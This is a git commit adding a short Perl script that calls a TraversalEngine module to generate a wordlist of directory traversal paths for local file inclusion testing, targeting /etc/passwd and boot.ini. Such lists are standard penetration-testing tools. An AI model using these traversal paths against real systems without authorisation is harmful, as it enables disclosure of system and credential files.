acd4be0abdd9ec4223c41c6dd9f686c885f69e5d
alecjmaly <alecjmaly@gmail.com>
2022-02-14 09:48:09 -0500

    updated

---
+++ tools/lfi_directory_traversal/generate.pl
@@ -0,0 +1,28 @@
+
+use lib qw(.);
+use TraversalEngine;
+
+
+my $OS = "windows";
+my $min_deep = 7; # 1
+my $deep = 7;
+my @files = ("/etc/passwd", "boot.ini");
+
+#output file
+open(FH, '>', "lfi_directory_traversal_wordlist.txt") or die $!;
+
+
+$counter = 0;
+foreach $file (@files) {
+    @traversals = TraversalEngine($OS, $min_deep, $deep, $file);
+    foreach $trav (@traversals) {
+        print $trav . "\n";
+        
+        print FH $trav . "\n"; # output to file
+        $counter = $counter + 1;
+    }
+}
+
+
+print "\n\n[+] " . $counter . " paths generated --> lfi_directory_traversal_wordlist.txt";
+
